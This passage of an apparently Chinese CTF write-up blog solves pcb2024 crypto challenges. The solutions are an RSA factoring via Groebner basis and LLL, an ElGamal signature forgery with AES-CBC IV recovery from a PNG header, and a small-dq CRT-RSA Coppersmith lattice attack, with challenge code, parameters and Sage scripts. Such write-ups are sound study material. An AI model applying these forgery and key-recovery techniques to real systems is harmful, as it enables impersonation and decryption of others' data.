11850797596095451670524864488046085367812828367468720385501401042627802035427938560866042101544712923470757782908521283827297125349504897418356898752774318846698532487439368216818306352553082800908866174488983776084101115047054799618258909847935672497139557595959270012943240666681053544905262111921321629682394432293381001209674417203517322559283298774214341100975920287314509947562597521988516473281739331823626676843441511662000240327706777269733836703945274332346982187104319993337626265180132608256601473051048047584429295402047392826197446200263357260338332947498385907066370674323324146485465822881995994908925</span></span><br><span class="line"><span class="comment"># 21318014445451076173373282785176305352774631352746325570797607376133429388430074045541507180590869533728841479322829078527002230672051057531691634445544608584952008820389785877589775003311007782211153558201413379523215950193011250189319461422835303446888969202767656215090179505169679429932715040614611462819788222032915253996376941436179412296039698843901058781175173984980266474602529294294210502556931214075073722598225683528873417278644194278806584861250188304944748756498325965302770207316134309941501186831407953950259399116931502886169434888276069750811498361059787371599929532460624327554481179566565183721777</span></span><br><span class="line"><span class="comment"># 4780454330598494796755521994676122817049316484524449315904838558624282970709853419493322324981097593808974378840031638879097938241801612033487018497098140216369858849215655128326752931937595077084912993941304190099338282258345677248403566469008681644014648936628917169410836177868780315684341713654307395687505633335014603359767330561537038768638735748918661640474253502491969012573691915259958624247097465484616897537609020908205710563729989781151998857899164730749018285034659826333237729626543828084565456402192248651439973664388584573568717209037035304656129544659938260424175198672402598017357232325892636389317</span></span><br><span class="line"><span class="comment"># 9819969459625593669601382899520076842920503183309309803192703938113310555315820609668682700395783456748733586303741807720797250273398269491111457242928322099763695038354042594669354762377904219084248848357721789542296806917415858628166620939519882488036571575584114090978113723733730014540463867922496336721404035184980539976055043268531950537390688608145163366927155216880223837210005451630289274909202545128326823263729300705064272989684160839861214962848466991460734691634724996390718260697593087126527364129385260181297994656537605275019190025309958225118922301122440260517901900886521746387796688737094737637604</span></span><br></pre></td></tr></table></figure><p>懂的都懂，原题，上周的强网杯也上了，<a href="https://dexterjie.github.io/2024/11/04/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/">apbq</a>，<a href="https://github.com/defund/ctf/blob/master/angstromctf-2024/blahaj/solve.sage">脚本</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">c=<span class="number">11850797596095451670524864488046085367812828367468720385501401042627802035427938560866042101544712923470757782908521283827297125349504897418356898752774318846698532487439368216818306352553082800908866174488983776084101115047054799618258909847935672497139557595959270012943240666681053544905262111921321629682394432293381001209674417203517322559283298774214341100975920287314509947562597521988516473281739331823626676843441511662000240327706777269733836703945274332346982187104319993337626265180132608256601473051048047584429295402047392826197446200263357260338332947498385907066370674323324146485465822881995994908925</span></span><br><span class="line">n=<span class="number">21318014445451076173373282785176305352774631352746325570797607376133429388430074045541507180590869533728841479322829078527002230672051057531691634445544608584952008820389785877589775003311007782211153558201413379523215950193011250189319461422835303446888969202767656215090179505169679429932715040614611462819788222032915253996376941436179412296039698843901058781175173984980266474602529294294210502556931214075073722598225683528873417278644194278806584861250188304944748756498325965302770207316134309941501186831407953950259399116931502886169434888276069750811498361059787371599929532460624327554481179566565183721777</span></span><br><span class="line">y=<span class="number">4780454330598494796755521994676122817049316484524449315904838558624282970709853419493322324981097593808974378840031638879097938241801612033487018497098140216369858849215655128326752931937595077084912993941304190099338282258345677248403566469008681644014648936628917169410836177868780315684341713654307395687505633335014603359767330561537038768638735748918661640474253502491969012573691915259958624247097465484616897537609020908205710563729989781151998857899164730749018285034659826333237729626543828084565456402192248651439973664388584573568717209037035304656129544659938260424175198672402598017357232325892636389317</span></span><br><span class="line">x=<span class="number">9819969459625593669601382899520076842920503183309309803192703938113310555315820609668682700395783456748733586303741807720797250273398269491111457242928322099763695038354042594669354762377904219084248848357721789542296806917415858628166620939519882488036571575584114090978113723733730014540463867922496336721404035184980539976055043268531950537390688608145163366927155216880223837210005451630289274909202545128326823263729300705064272989684160839861214962848466991460734691634724996390718260697593087126527364129385260181297994656537605275019190025309958225118922301122440260517901900886521746387796688737094737637604</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">R = Integers(n)</span><br><span class="line"></span><br><span class="line">P.&lt;a, b, p, q&gt; = PolynomialRing(Integers(n))</span><br><span class="line"></span><br><span class="line">f1 = a*p + q</span><br><span class="line"></span><br><span class="line">f2 = p + b*q</span><br><span class="line"></span><br><span class="line">f3 = p*q</span><br><span class="line"></span><br><span class="line">I = Ideal([f1 - x, f2 - y, f3 - n])</span><br><span class="line">B = I.groebner_basis()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">g = B[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">z = ZZ(g.coefficient(&#123;q: <span class="number">1</span>&#125;))</span><br><span class="line"><span class="keyword">assert</span> g.constant_coefficient() == R(-y)</span><br><span class="line"></span><br><span class="line">_, (z1, _), (z2, _) = <span class="built_in">list</span>(g)</span><br><span class="line">z1 = ZZ(z1)</span><br><span class="line">z2 = ZZ(z2)</span><br><span class="line"></span><br><span class="line">S = <span class="number">2</span>^<span class="number">1024</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p_upper_bits <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    p_upper = p_upper_bits &lt;&lt; <span class="number">1020</span></span><br><span class="line">    <span class="keyword">for</span> q_upper_bits <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        q_upper = q_upper_bits &lt;&lt; <span class="number">1020</span></span><br><span class="line">        M = matrix(ZZ, [[S, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>], [S*z1, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>], [S*(z2 + p_upper + q_upper*z1), <span class="number">0</span>, <span class="number">0</span>, S], [S*n, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]])</span><br><span class="line">        B = M.LLL()</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> B:</span><br><span class="line">            <span class="keyword">if</span> b[-<span class="number">1</span>] == S:</span><br><span class="line">                <span class="keyword">if</span> b[<span class="number">1</span>] &lt; <span class="number">0</span>:</span><br><span class="line">                    b *= -<span class="number">1</span></span><br><span class="line">                p_guess = b[<span class="number">1</span>] + p_upper</span><br><span class="line">                q_guess = b[<span class="number">2</span>] + q_upper</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> p_guess * q_guess == n:</span><br><span class="line">                    d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, (p_guess - <span class="number">1</span>)*(q_guess - <span class="number">1</span>))</span><br><span class="line">                    message = long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(c, d, n)))</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> message:</span><br><span class="line">                        <span class="built_in">print</span>(message)</span><br><span class="line">                        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>奇怪的是，这个<a href="https://connor-mccartney.github.io/cryptography/rsa/BLAHAJ-angstrom-CTF-2024">脚本</a>好像打不出来，上周强网杯是可以的</p><h3 id="Alice’sSecret-pcb2024-after-game"><a href="#Alice’sSecret-pcb2024-after-game" class="headerlink" title="Alice’sSecret-pcb2024(after game)"></a>Alice’sSecret-pcb2024(after game)</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> iv, KEY</span><br><span class="line"></span><br><span class="line"><span class="comment"># I think you will definitely be interested in the content in PNG!</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banner</span>():</span><br><span class="line">    <span class="built_in">print</span>(</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">=======================================================================================</span></span><br><span class="line"><span class="string">     _      _   _                 _           ____                                _   </span></span><br><span class="line"><span class="string">    / \    | | (_)   ___    ___  ( )  ___    / ___|    ___    ___   _ __    ___  | |_ </span></span><br><span class="line"><span class="string">   / _ \   | | | |  / __|  / _ \ |/  / __|   \___ \   / _ \  / __| | &#x27;__|  / _ \ | __|</span></span><br><span class="line"><span class="string">  / ___ \  | | | | | (__  |  __/     \__ \    ___) | |  __/ | (__  | |    |  __/ | |_ </span></span><br><span class="line"><span class="string"> /_/   \_\ |_| |_|  \___|  \___|     |___/   |____/   \___|  \___| |_|     \___|  \__|</span></span><br><span class="line"><span class="string">                                                                                      </span></span><br><span class="line"><span class="string">=======================================================================================</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">return</span> m + (<span class="number">16</span> - (<span class="built_in">len</span>(m) % <span class="number">16</span>)) * <span class="string">b&quot;\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pngdata</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;picture.png&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        png_data = f.read()</span><br><span class="line">    <span class="keyword">return</span> pad(png_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_Key</span>(<span class="params">bits</span>):</span><br><span class="line">    p = getPrime(bits)</span><br><span class="line">    g = getPrime(bits // <span class="number">2</span>)</span><br><span class="line">    d = random.randint(<span class="number">1</span>, p - <span class="number">2</span>)</span><br><span class="line">    y = <span class="built_in">pow</span>(g, d, p)</span><br><span class="line">    public, private = (p, g, y), d</span><br><span class="line">    <span class="keyword">return</span> public, private</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Signature</span>(<span class="params">m, public, private</span>):</span><br><span class="line">    m = bytes_to_long(m)</span><br><span class="line">    p, g, _ = public</span><br><span class="line">    d = private</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        k = random.randint(<span class="number">1</span>, p - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> gmpy2.gcd(k, p - <span class="number">1</span>) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    r = <span class="built_in">pow</span>(g, k, p)</span><br><span class="line">    s = ((m - d * r) * inverse(k, p - <span class="number">1</span>)) % (p - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> (r, s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Verity</span>(<span class="params">m, sign, public</span>):</span><br><span class="line">    m = bytes_to_long(m)</span><br><span class="line">    p, g, y = public</span><br><span class="line">    r, s = sign</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">pow</span>(g, m, p) == (<span class="built_in">pow</span>(y, r, p) * <span class="built_in">pow</span>(r, s, p)) % p:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chall</span>():</span><br><span class="line">    banner()</span><br><span class="line"></span><br><span class="line">    pub, pri = get_Key(<span class="number">512</span>)</span><br><span class="line">    png_data = get_pngdata()</span><br><span class="line">    <span class="built_in">print</span>(</span><br><span class="line">        <span class="string">&quot;Hello! I&#x27;m Alice. To ensure that you are truly Bob, I need to verify your identity first!&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Can I help you sign once? Is there anything you need to sign?&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Here are your public key:<span class="subst">&#123;pub&#125;</span>&quot;</span>)</span><br><span class="line">    message = long_to_bytes(<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Give me what you need to sign:&quot;</span>)))</span><br><span class="line">    <span class="keyword">if</span> message == <span class="string">b&quot;Bob&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No, it&#x27;s not possible!!!&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Here are your sign:&quot;</span>)</span><br><span class="line">    r, s = Signature(message, pub, pri)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;r = <span class="subst">&#123;r&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;s = <span class="subst">&#123;s&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Tell me your signature so that I know you are truly Bob.&quot;</span>)</span><br><span class="line">    r = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;r = &quot;</span>))</span><br><span class="line">    s = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;s = &quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> Verity(<span class="string">b&quot;Bob&quot;</span>, (r, s), pub):</span><br><span class="line">        <span class="built_in">print</span>(</span><br><span class="line">            <span class="string">&quot;I have a great photo that I would like to share with you. Let&#x27;s send it to you in our old way! Hope you still keep our IV!&quot;</span></span><br><span class="line">        )</span><br><span class="line">        aes = AES.new(KEY, AES.MODE_CBC, iv)</span><br><span class="line">        enc_data = <span class="built_in">hex</span>(bytes_to_long(aes.encrypt(png_data)))[<span class="number">2</span>:]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Here is my encoded data:<span class="subst">&#123;enc_data&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Here is my key:<span class="subst">&#123;KEY.decode()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;In summary, I wish you a wonderful day!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Alright, you&#x27;re not Bob, I don&#x27;t have anything to chat with anymore.&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        chall()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>这道题(当时好眼熟，没看出来)，<code>ElGamal签名方案</code>，但是环境题，想放后面做，结果没时间看了</p><p>赛后再看，应该就是选择签名伪造了，这里我们可以得到消息的签名(即<code>rs</code>)，然后进行验证<br><img src="https://pic1.zhimg.com/80/v2-adb3f6da452b31564230aea1107cc62c_1440w.png" alt=""><br><a href="https://ctf-wiki.org/crypto/signature/elgamal/#_15">https://ctf-wiki.org/crypto/signature/elgamal/#_15</a><br>所以关键在于伪造消息<code>b&#39;xxxx&#39;</code>与<code>b&#39;Bob</code>模<code>p-1</code>同余，同时题目还把公钥给了我们<code>(p, g, y)</code>，有<code>p</code>就够了</p><p>其实就是费马小定理，可以这样$g^{m}\equiv g^{m+k*(p-1)}(mod\ p)$<br>代码表示，<code>message = long_to_bytes(bytes_to_long(b&#39;Bob&#39;)+pub[0]-1)</code></p><p>后面是<code>AES</code>，题目会给我们<code>KEY</code>，还是<code>CBC mode</code>，所以我们要把<code>iv</code>找出来<br><img src="https://picx.zhimg.com/80/v2-8d912081ccb73bea5ace1d9628057fa9_1440w.png" alt=""><br><img src="https://picx.zhimg.com/80/v2-02cb496288e7eaa8013f7d6963ec8c92_1440w.png" alt=""><br>还是老样子，<code>png</code>的前十六字节是固定的，<code>0x89504e470d0a1a0a0000000d49484452</code>，我们可以把密文通过<code>key</code>解密之后的数据异或<code>png</code>的文件头，即可拿到题目中的<code>iv</code><br>然后，密文通过<code>key</code>解密之后的数据，可以自己把<code>iv</code>设成全零，即可得到</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="comment"># 消息伪造</span></span><br><span class="line">pub = ()</span><br><span class="line">message = bytes_to_long(<span class="string">b&#x27;Bob&#x27;</span>)+pub[<span class="number">0</span>]-<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line"><span class="comment"># iv恢复</span></span><br><span class="line">enc_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">head = <span class="number">0x89504e470d0a1a0a0000000d49484452</span></span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">data = bytes_to_long(aes.decrypt(<span class="built_in">bytes</span>.fromhex(enc_data)[:<span class="number">16</span>]))</span><br><span class="line">iv = long_to_bytes(data ^ head)</span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">png_data =aes.decrypt(<span class="built_in">bytes</span>.fromhex(enc_data))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;picture.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    f.write(png_data)</span><br></pre></td></tr></table></figure><p>思路跟大致的脚本如上，环境也没有了，就不写交互脚本了</p><h3 id="tarssc-pcb2024-复现"><a href="#tarssc-pcb2024-复现" class="headerlink" title="tarssc-pcb2024(复现)"></a>tarssc-pcb2024(复现)</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">nbit  = <span class="number">1024</span></span><br><span class="line">beta  = <span class="number">0.30</span></span><br><span class="line">delta = <span class="number">0.10</span></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="built_in">int</span>(beta * nbit))</span><br><span class="line">q = getPrime(nbit - <span class="built_in">int</span>(beta * nbit))</span><br><span class="line"></span><br><span class="line">N = p * q</span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    dq = random.randrange(<span class="number">1</span>,<span class="built_in">int</span>(N ** delta))</span><br><span class="line">    <span class="keyword">if</span> dq &gt; q-<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    dp = random.randrange(<span class="number">1</span>,p-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        d = Integer(crt([dp%(p-<span class="number">1</span>),dq%(q-<span class="number">1</span>)],[p-<span class="number">1</span>,q-<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> GCD(d,phi) == <span class="number">1</span>:</span><br><span class="line">        e = <span class="built_in">int</span>(inverse(d,phi))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">seckey, pubkey = (p,q,d,dp,dq), (N,e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;N = <span class="subst">&#123;N&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag), e, N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">N = 61857467041120006957454494977971762866359211220721592255304580940306873708357617802596067329984189345493420858543581027612648626678588277060222860337783377316655375278359169520243355170247177279595812282793212550819124960549824278287538977769728573023023364686725321548391592858202718446127851076431000427033</span></span><br><span class="line"><span class="string">e = 22696852369762746127523066296087974245933137295782964284054040654103039210164173227291367914580709029582944005335464668969366909190396194570924426653294883884186299265660358589254391341147028477295482787041170991166896788171334992065199814524969470117229229967188623636764051681654720429531708441920158042161</span></span><br><span class="line"><span class="string">c = 41862679760722981662840433621129671566139143933210627878095169470855743742734397276638345217059912784871301273620533442249011607182329472311453700434692358352210197988000738272869600692181834281813995048665466937302183039555350612260646428575598237960405962714063137455677605629008760761743568236135324015278</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>这题很明显是<code>crtRSA</code><br>看到有一题类似的，2021的极客大挑战<code>crtrsa</code><br>卡这题卡半天，可以测试一下题目的代码，发现<code>dq</code>是比<code>dp</code>小的，二者不平衡<br>可以试试<code>dq</code>泄露<a href="https://www.cnblogs.com/vconlln/p/17066500.html">https://www.cnblogs.com/vconlln/p/17066500.html</a><br>还发现了一篇论文<br><a href="https://dds.sciengine.com/cfs/files/pdfs/1674-7267/6qxpd6SSmokuc5vLD-mark.pdf">https://dds.sciengine.com/cfs/files/pdfs/1674-7267/6qxpd6SSmokuc5vLD-mark.pdf</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> copy <span class="keyword">import</span> deepcopy</span><br><span class="line"><span class="comment"># https://www.iacr.org/archive/pkc2006/39580001/39580001.pdf</span></span><br><span class="line"><span class="comment"># Author: ZM__________J, To1in</span></span><br><span class="line">N = <span class="number">61857467041120006957454494977971762866359211220721592255304580940306873708357617802596067329984189345493420858543581027612648626678588277060222860337783377316655375278359169520243355170247177279595812282793212550819124960549824278287538977769728573023023364686725321548391592858202718446127851076431000427033</span></span><br><span class="line">e = <span class="number">22696852369762746127523066296087974245933137295782964284054040654103039210164173227291367914580709029582944005335464668969366909190396194570924426653294883884186299265660358589254391341147028477295482787041170991166896788171334992065199814524969470117229229967188623636764051681654720429531708441920158042161</span></span><br><span class="line">c = <span class="number">41862679760722981662840433621129671566139143933210627878095169470855743742734397276638345217059912784871301273620533442249011607182329472311453700434692358352210197988000738272869600692181834281813995048665466937302183039555350612260646428575598237960405962714063137455677605629008760761743568236135324015278</span></span><br><span class="line">alpha = log(e, N)</span><br><span class="line">beta = <span class="number">0.30</span></span><br><span class="line">delta = <span class="number">0.10</span></span><br><span class="line">P.&lt;x,y,z&gt;=PolynomialRing(ZZ)</span><br><span class="line"> </span><br><span class="line">X = ceil(<span class="number">2</span> * N^(alpha + beta + delta - <span class="number">1</span>))</span><br><span class="line">Y = ceil(<span class="number">2</span> * N^beta)</span><br><span class="line">Z = ceil(<span class="number">2</span> * N^(<span class="number">1</span> - beta))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="keyword">return</span> x*(N-y)+N</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trans</span>(<span class="params">f</span>):</span><br><span class="line">    my_tuples = f.exponents(as_ETuples=<span class="literal">False</span>)</span><br><span class="line">    g = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> my_tuple <span class="keyword">in</span> my_tuples:</span><br><span class="line">        exponent = <span class="built_in">list</span>(my_tuple)</span><br><span class="line">        mon = x ^ exponent[<span class="number">0</span>] * y ^ exponent[<span class="number">1</span>] * z ^ exponent[<span class="number">2</span>]</span><br><span class="line">        tmp = f.monomial_coefficient(mon)</span><br><span class="line">        </span><br><span class="line">        my_minus = <span class="built_in">min</span>(exponent[<span class="number">1</span>], exponent[<span class="number">2</span>])</span><br><span class="line">        exponent[<span class="number">1</span>] -= my_minus</span><br><span class="line">        exponent[<span class="number">2</span>] -= my_minus</span><br><span class="line">        tmp *= N^my_minus</span><br><span class="line">        tmp *= x ^ exponent[<span class="number">0</span>] * y ^ exponent[<span class="number">1</span>] * z ^ exponent[<span class="number">2</span>]</span><br><span class="line">        </span><br><span class="line">        g += tmp</span><br><span class="line">    <span class="keyword">return</span> g</span><br><span class="line">  </span><br><span class="line">m = <span class="number">5</span> <span class="comment"># need to be adjusted according to different situations</span></span><br><span class="line">tau = ((<span class="number">1</span> - beta)^<span class="number">2</span> - delta) / (<span class="number">2</span> * beta * (<span class="number">1</span> - beta))</span><br><span class="line">sigma = (<span class="number">1</span> - beta - delta) / (<span class="number">2</span> * (<span class="number">1</span> - beta))</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(sigma * m)</span><br><span class="line"><span class="built_in">print</span>(tau * m)</span><br><span class="line"> </span><br><span class="line">s = ceil(sigma * m)</span><br><span class="line">t = ceil(tau * m)</span><br><span class="line">my_polynomials = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m-i+<span class="number">1</span>):</span><br><span class="line">        g_ij = trans(e^(m-i) * x^j * z^s * f(x, y)^i)</span><br><span class="line">        my_polynomials.append(g_ij)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t+<span class="number">1</span>):</span><br><span class="line">        h_ij = trans(e^(m-i) * y^j * z^s * f(x, y)^i)</span><br><span class="line">        my_polynomials.append(h_ij)</span><br><span class="line">        </span><br><span class="line">known_set = <span class="built_in">set</span>()</span><br><span class="line">new_polynomials = []</span><br><span class="line">my_monomials = []</span><br><span class="line"> </span><br><span class="line"><span class="comment"># construct partial order</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(my_polynomials) &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(my_polynomials)):</span><br><span class="line">        f = my_polynomials[i]</span><br><span class="line">        current_monomial_set = <span class="built_in">set</span>(x^tx * y^ty * z^tz <span class="keyword">for</span> tx, ty, tz <span class="keyword">in</span> f.exponents(as_ETuples=<span class="literal">False</span>))</span><br><span class="line">        delta_set = current_monomial_set - known_set</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(delta_set) == <span class="number">1</span>:</span><br><span class="line">            new_monomial = <span class="built_in">list</span>(delta_set)[<span class="number">0</span>]</span><br><span class="line">            my_monomials.append(new_monomial)</span><br><span class="line">            known_set |= current_monomial_set</span><br><span class="line">            new_polynomials.append(f)            </span><br><span class="line">            my_polynomials.pop(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;GG&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">my_polynomials = deepcopy(new_polynomials)</span><br><span class="line"> </span><br><span class="line">nrows = <span class="built_in">len</span>(my_polynomials)</span><br><span class="line">ncols = <span class="built_in">len</span>(my_monomials)</span><br><span class="line">L = [[<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ncols)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nrows)]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nrows):</span><br><span class="line">    g_scale = my_polynomials[i](X * x, Y * y, Z * z)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ncols):</span><br><span class="line">        L[i][j] = g_scale.monomial_coefficient(my_monomials[j])</span><br><span class="line">        </span><br><span class="line"><span class="comment"># remove N^j</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nrows):</span><br><span class="line">    Lii = L[i][i]</span><br><span class="line">    N_Power = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (Lii % N == <span class="number">0</span>):</span><br><span class="line">        N_Power *= N</span><br><span class="line">        Lii //= N</span><br><span class="line">    L[i][i] = Lii</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ncols):</span><br><span class="line">        <span class="keyword">if</span> (j != i):</span><br><span class="line">            L[i][j] = (L[i][j] * inverse_mod(N_Power, e^m))</span><br><span class="line"> </span><br><span class="line">L = Matrix(ZZ, L)</span><br><span class="line">nrows = L.nrows()</span><br><span class="line"> </span><br><span class="line">L = L.LLL()</span><br><span class="line"><span class="comment"># Recover poly</span></span><br><span class="line">reduced_polynomials = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nrows):</span><br><span class="line">    g_l = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ncols):</span><br><span class="line">        g_l += L[i][j] // my_monomials[j](X, Y, Z) * my_monomials[j]</span><br><span 